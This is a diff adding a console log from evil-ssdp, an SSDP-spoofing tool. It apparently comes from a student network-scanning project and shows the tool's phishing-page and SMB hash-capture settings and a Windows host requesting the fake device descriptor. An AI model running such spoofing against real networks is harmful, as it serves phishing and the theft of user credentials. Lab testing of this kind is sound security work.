@@ -1,0 +1,35 @@
+File created on 2024-04-16 21:08:58
+
+
+___________     .__.__    _________ _________________ __________
+\_   _____/__  _|__|  |  /   _____//   _____/\______ \\______   \
+ |    __)_\  \/ /  |  |  \_____  \ \_____  \  |    |  \|     ___/
+ |        \\   /|  |  |__/        \/        \ |    `   \    |
+/_______  / \_/ |__|____/_______  /_______  //_______  /____|
+        \/                      \/        \/         \/
+
+...by initstring (github.com/initstring)
+
+
+
+
+########################################
+[94m[*] [0mEVIL TEMPLATE:           /home/yash/Documents/GitHub/FYP-scan-devices-on-network/essdp/evil/templates/scanner
+[94m[*] [0mMSEARCH LISTENER:        ens37
+[94m[*] [0mDEVICE DESCRIPTOR:       http://192.168.0.171:8888/ssdp/device-desc.xml
+[94m[*] [0mSERVICE DESCRIPTOR:      http://192.168.0.171:8888/ssdp/service-desc.xml
+[94m[*] [0mPHISHING PAGE:           http://192.168.0.171:8888/ssdp/present.html
+[94m[*] [0mSMB POINTER:             file://///192.168.0.171/smb/hash.jpg
+########################################
+
+
+
+[94m[M-SEARCH]     [0mNew Host 192.168.0.4, Service Type: urn:dial-multiscreen-org:service:dial:1
+[92m[XML REQUEST]  [0mHost: 192.168.0.4, User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
+               GET /ssdp/device-desc.xml
+[92m[XML REQUEST]  [0mHost: 192.168.0.4, User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
+               GET /ssdp/device-desc.xml
+[92m[XML REQUEST]  [0mHost: 192.168.0.4, User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0
+               GET /ssdp/device-desc.xml
+[92m[XML REQUEST]  [0mHost: 192.168.0.4, User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0
+               GET /ssdp/device-desc.xml
